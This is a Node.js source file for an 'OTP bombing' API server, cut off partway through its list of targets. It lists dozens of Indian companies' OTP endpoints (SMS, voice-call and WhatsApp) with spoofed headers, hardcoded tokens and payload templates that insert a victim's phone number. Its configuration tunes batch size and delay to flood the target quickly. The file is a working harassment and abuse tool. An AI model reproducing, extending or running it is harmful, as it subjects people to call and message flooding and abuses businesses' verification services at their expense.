// ============================================================
// api_server.js - OTP Bombing API Server (FAST + OFFSET ROTATION)
// 134 Working APIs | Offset-based rotation
// Har server alag APIs call karega same time pe
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 🔥 FAST CONFIGURATION
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 20;        // 100 → 20
const BATCH_SIZE = 20;            // 5 → 20
const API_TIMEOUT_MS = 2500;      // 5000 → 2500

// ⚡ Config
const APIS_PER_CALL = 10;         // Har call me kitni APIs (134/13 ≈ 10)

// ============================================================
// ===== SIRF 134 WORKING APIs (2xx Success Verified) =====
// ============================================================

const APIS = [
    // ============================================================
    // ✅ SMS APIs (Working)
    // ============================================================
    {
        name: "SmartCoin_SMS",
        method: "POST",
        url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, app_version: "100101", channel: "SMS", request_type: "REGISTRATION", onboarding_consent: true })
    },
    {
        name: "DamieCloud_SMS",
        method: "GET",
        url: "https://damiecloud.online/send/{phone}",
        headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36", "Accept": "*/*" }
    },

    // ============================================================
    // ✅ CALL APIs (Working)
    // ============================================================
    {
        name: "TataCapital_Voice",
        method: "POST",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        headers: { "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Astrosage_Call",
        method: "GET",
        url: "https://varta.astrosage.com/sdk/send-otp-via-call?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&operation_name=blank&jsonpcall=1&fromresend=0&_=0",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Accept": "*/*",
            "X-Requested-With": "pure.lite.browser",
            "Referer": "http://www.astrosage.com/"
        }
    },
    {
        name: "Myntra Voice",
        url: "https://www.myntra.com/gw/mobile-auth/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "MakeMyTrip Voice",
        url: "https://www.makemytrip.com/api/4/voice-otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Voot Voice",
        url: "https://www.voot.com/api/v1/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Kotak Voice",
        url: "https://www.kotak.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Refyne Voice",
        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "IVR", "recipient": phone})
    },
    {
        name: "Doubtnut Voice",
        url: "https://doubtnut.com/api/v2/otpgenerate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Zepto Voice",
        url: "https://zepto.com/v1/user/otplogin",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
    },
    {
        name: "Zivame Voice",
        url: "https://zivame.com/api/v2/customer/login/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone, "otp_type": "voice"})
    },
    {
        name: "MyJar Call",
        url: "https://prod.myjar.app/v2/api/auth/sendOTP/call?phoneNumber={phone}",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Swiggy_Verified",
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        headers: { "user-agent": "Swiggy-Android", "content-type": "application/json; charset=utf-8" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "MagicBricks_Call", url: "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}", method: "GET", headers: {}
    },
    {
        name: "RealEstateIndia_Call", url: "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php", method: "POST",
        headers: { "x-requested-with": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "action_id=call_to_otp&mob_num={phone}&member_id=1547045" }
    },

    // ============================================================
    // ✅ WHATSAPP APIs (Working)
    // ============================================================
    {
        name: "Breeze_WA",
        method: "POST",
        url: "https://api.breeze.in/session/start",
        headers: { "Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8" },
        data: (phone) => JSON.stringify({ phoneNumber: phone, authVerificationType: "otp", device: { id: "A1pKVEDhlv66KLtoYsml3", platform: "Chrome", type: "Desktop" }, countryCode: "+91" })
    },
    {
        name: "GoKwik_WA",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: { "accept": "application/json", "content-type": "application/json", "gk-merchant-id": "19g6im8srkz9y" },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Licious_WA",
        method: "POST",
        url: "https://www.licious.in/api/login/signup",
        headers: { "Accept": "application/json", "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, captcha_token: null })
    },
    {
        name: "OYO_WA",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: { "Accept": "application/json", "Content-Type": "text/plain;charset=UTF-8", "Cookie": "user_id=none; country_code=IN;" },
        data: (phone) => JSON.stringify({ phone: phone, country_code: "+91", nod: 4 })
    },
    {
        name: "KPNFresh_WA",
        method: "POST",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        headers: { "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "AdityaBirla_WA",
        method: "POST",
        url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        data: { "_raw": "MobileNumber={phone}&functionality=signup" }
    },
    {
        name: "IIFL_WA",
        method: "POST",
        url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
        headers: { "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" },
        data: { "_raw": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1" }
    },
    {
        name: "AstroSage_WA",
        method: "GET",
        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank",
        headers: { "accept": "*/*", "referer": "https://www.astrosage.com/" }
    },
    {
        name: "BharatLoan_WA",
        method: "POST",
        url: "https://www.bharatloan.com/login-sbm",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" }
    },
    {
        name: "Zerodha_WA",
        method: "POST",
        url: "https://zerodha.com/account/registration.php",
        headers: { "accept": "*/*", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone, source: "zerodha", partner_id: "" })
    },
    {
        name: "MediBuddy_WA",
        method: "POST",
        url: "https://loginprod.medibuddy.in/unified-login/user/register",
        headers: { "accept": "application/json", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ source: "medibuddyInWeb", platform: "medibuddy", phonenumber: phone, flow: "Retail-Login-Home-Flow" })
    },
    {
        name: "Tyreplex_WA",
        method: "POST",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Moglix_WA",
        method: "POST",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://www.moglix.com", "referer": "https://www.moglix.com/" },
        data: (phone) => JSON.stringify({ email: "", phone: phone, type: "p", source: "signup", buildVersion: "DESKTOP-7.3", device: "desktop" })
    },
    {
        name: "Vidyakul_WA",
        method: "POST",
        url: "https://vidyakul.com/signup-otp/send",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://vidyakul.com",
            "referer": "https://vidyakul.com/class-12th/test-series",
            "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "Vedantu_WA",
        method: "POST",
        url: "https://user.vedantu.com/user/preLoginVerification",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/register" },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false })
    },
    {
        name: "Myntra_WA",
        method: "POST",
        url: "https://www.myntra.com/gateway/v1/auth/getotp",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.myntra.com", "referer": "https://www.myntra.com/login", "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f", "x-myntraweb": "Yes", "x-requested-with": "browser", "x-location-context": "pincode=276304;source=IP", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
        data: (phone) => JSON.stringify({ phoneNumber: phone, signup: "ONECLICK" })
    },
    {
        name: "IndiaMart_WA",
        method: "POST",
        url: "https://m.indiamart.com/ajaxrequest/identified/common/login",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://m.indiamart.com", "referer": "https://m.indiamart.com/login/" },
        data: (phone) => JSON.stringify({ GEOIP_COUNTRY_ISO: "IN", IP: "47.9.35.50", IPADDRESS: "47.9.35.50", IP_COUNTRY: "India", ciso: "IN", duplicateEmailCheck: "", glid: "", glusr_usr_ip: "47.9.35.50", originalreferer: "https://m.indiamart.com/login/", pass: "", ph_code: "91", use: phone })
    },
    {
        name: "CityMallWeb_WA",
        method: "POST",
        url: "https://citymall.live/web-api/auth/send-otp",
        headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "host": "citymall.live", "origin": "https://citymall.live", "referer": "https://citymall.live/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },
    {
        name: "Zepto_WA",
        method: "POST",
        url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        headers: { "Content-Type": "application/json", "Accept": "application/json", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/" },
        data: (phone) => JSON.stringify({ mobileNumber: phone, countryCode: "+91" })
    },
    {
        name: "HeroFinCorp_WA", url: "https://loans.apps.herofincorp.com/api/generateOtp", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true })
    },
    {
        name: "Jockey_WhatsApp", url: "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        method: "GET",
        headers: { "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", "accept": "*/*" }
    },
    {
        name: "Refyne WhatsApp",
        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "WHATSAPP", "recipient": phone})
    },
    {
        name: "VisitApp WhatsApp",
        url: "https://api.getvisitapp.com/v3/new-auth/login-phone",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "whatsapp", "countryCode": 91, "phone": phone, "platform": "WEB"})
    },

    // ============================================================
    // ✅ TIER 1 — OLD RELIABLE
    // ============================================================
    {
        name: "GetInstaCash",
        method: "POST",
        url: "https://getinstacash.in/sell/getData.php",
        headers: {
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://getinstacash.in",
            "Referer": "https://getinstacash.in/sell/login"
        },
        data: { "_raw": "type=sendOTP&mobile={phone}" }
    },
    {
        name: "Flipkart_2",
        method: "GET",
        url: "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default"
        }
    },
    {
        name: "AakashDigital_2",
        method: "POST",
        url: "https://digital.aakash.ac.in/signup-otp-verify",
        headers: {
            "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/user/register"
        },
        data: { "_raw": "&mobileval={phone}" }
    },
    {
        name: "RedBus_1",
        method: "GET",
        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.redbus.in/preregister"
        }
    },
    {
        name: "Snapdeal",
        method: "POST",
        url: "https://m.snapdeal.com/signupCompleteAjax",
        headers: {
            "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
            "h2": "true",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "u": "160081122259159083", "accept": "*/*", "origin": "https://m.snapdeal.com", "referer": "https://m.snapdeal.com/signin"
        },
        data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" }
    },
    {
        name: "Quikr",
        method: "POST",
        url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept": "*/*",
            "origin": "https://www.quikr.com", "referer": "https://www.quikr.com/"
        },
        data: { "_raw": "user={phone}&v3=true" }
    },
    {
        name: "Ogonn",
        method: "POST",
        url: "https://ogonn.in/otp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01", "origin": "https://ogonn.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://ogonn.in/login"
        },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "AakashDigital_1",
        method: "POST",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        headers: {
            "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://digital.aakash.ac.in/"
        },
        data: { "_raw": "&mobileval={phone}&otp=6230" }
    },
    {
        name: "Flipkart_1",
        method: "POST",
        url: "https://1.rome.api.flipkart.com/1/action/view",
        headers: {
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
            "Origin": "https://www.flipkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json", "Accept": "*/*", "Referer": "https://www.flipkart.com/login"
        },
        data: {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{phone}",
                "clientQueryParamMap": { "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT" },
                "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "sourceContext": "DEFAULT"
            }
        }
    },
    {
        name: "KPN WhatsApp",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        method: "POST",
        headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
        data: (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "Hungama OTP",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" })
    },
    {
        name: "Delhivery",
        method: "GET",
        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },

    // ============================================================
    // ✅ NEW WORKING — 9 APIs
    // ============================================================
    {
        name: "JioSaavn", url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
        method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://www.jiosaavn.com", "Referer": "https://www.jiosaavn.com/" },
        data: (phone) => JSON.stringify({ phone_number: "+91" + phone })
    },
    {
        name: "Naaptol", url: "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.naaptol.com", "pagesecuritytoken": "DE3NzMzMTY2NTY3NTZfVkBAcHRvbF83MzA1ODUyba",
            "referer": "https://www.naaptol.com/", "x-requested-with": "XMLHttpRequest"
        },
        data: (phone) => JSON.stringify({ actionname: "checkMobileUserExistsForTvApp", mobile: phone })
    },
    {
        name: "Zepto", url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        method: "POST", headers: { "Content-Type": "application/json", "Accept": "application/json", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/" },
        data: (phone) => JSON.stringify({ mobileNumber: phone })
    },
    {
        name: "Factori", url: "https://factori.com/login/check_user_exists",
        method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "origin": "https://factori.com", "referer": "https://factori.com/my-account" },
        data: { "_raw": "mobNumber={phone}&countryCode=91" }
    },
    {
        name: "Smytten", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        method: "POST", headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, email: "test@example.com" })
    },
    {
        name: "Tata Capital Business", url: "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        method: "POST", headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNumber: phone, deviceOs: "Android", sourceName: "MitayeFaasleWebsite" })
    },

    // ============================================================
    // ✅ NAYI UNTESTED APIs (Working ones)
    // ============================================================
    {
        name: "Wellness_Forever", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` })
    },
    {
        name: "TataCapital_Retail", url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/" },
        data: (phone) => JSON.stringify({ header: { authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", identifier: "nli" }, body: { mobileNumber: phone } })
    },
    {
        name: "Animall", url: "https://animall.in/zap/auth/login", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" })
    },
    {
        name: "Swipe", url: "https://app.getswipe.in/api/user/mobile_login", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone, resend: true })
    },
    {
        name: "Wrogn", url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", method: "POST",
        headers: { "accept": "*/*", "action": "sendOTP", "content-type": "application/json", "origin": "https://wrogn.com", "referer": "https://wrogn.com/", "shop_name": "wrogn-website.myshopify.com" },
        data: (phone) => JSON.stringify({ username: "+91" + phone, type: "mobile", domain: "wrogn.com", recaptcha_token: "" })
    },
    {
        name: "ServeTel", url: "https://api.servetel.in/v1/auth/otp", method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        data: { "_raw": "mobile_number={phone}" }
    },

    // ============================================================
    // ✅ 6 NAYI WORKING APIs
    // ============================================================
    {
        name: "RoyalChallengers", url: "https://shop.royalchallengers.com/api/customer/login",
        method: "POST",
        headers: { "Content-Type": "application/json", "user-agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ utype: "Online", mobile: phone, email: "" })
    },
    {
        name: "Cashify", url: "https://www.cashify.in/api/cu01/v1/app-link?mn={phone}",
        method: "GET", headers: { "user-agent": "okhttp/3.9.1" }
    },
    {
        name: "Tradgo", url: "https://tradgo.in/appapi4/Forgot_password_new/getOtp",
        method: "POST", headers: { "Content-Type": "application/json", "User-Agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Gapoon", url: "https://www.gapoon.com/userSignup",
        method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobile={phone}&email=noreply@gmail.com&name=LexLuthor" }
    },
    {
        name: "AllenSolly", url: "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
        method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobileoremail={phone}&name=markluther" }
    },
    {
        name: "Jockey_WhatsApp_New", url: "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        method: "GET",
        headers: { "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", "accept": "*/*" }
    },

    // ============================================================
    // ✅ ADDITIONAL WORKING APIs
    // ============================================================
    {
        name: "Cuemath_1",
        method: "POST",
        url: "https://www.cuemath.com/api/v4/parents/",
        headers: {
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/JSON",
            "Accept": "*/*",
            "Origin": "https://www.cuemath.com",
            "Referer": "https://www.cuemath.com/the-ultimate-cuemath-olympiad/partner/timesofindia/register/?intent=ultimate-olympiad",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "intl_mobile": { "phone": "" }, "phone": "{phone}", "email": "nsbd@dn.djs", "full_name": "hdhdhdg", "place_id": "ChIJYYhT3gl3AjoRUDlkL1i5oIk", "timezone": "Asia/Calcutta", "detail_source": "CMO_2020", "form_fields": "full_name,phone,email,place_id" }
    },
    {
        name: "Dream11_1",
        method: "POST",
        url: "https://www.dream11.com/graphql/mutation/pwa/register",
        headers: {
            "accept": "*/*",
            "device": "pwa",
            "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.dream11.com",
            "referer": "https://www.dream11.com/register?ru=",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}", "variables": { "email": "tsunami@gmail.com", "mobileNumber": "{phone}", "password": "tsunami@123astronomia" } }
    },
    {
        name: "Doubtnut",
        method: "POST",
        url: "https://doubtnut.com/api/v1/user/login",
        headers: {
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "*/*",
            "origin": "https://doubtnut.com",
            "referer": "https://doubtnut.com/login",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "Gaana",
        method: "POST",
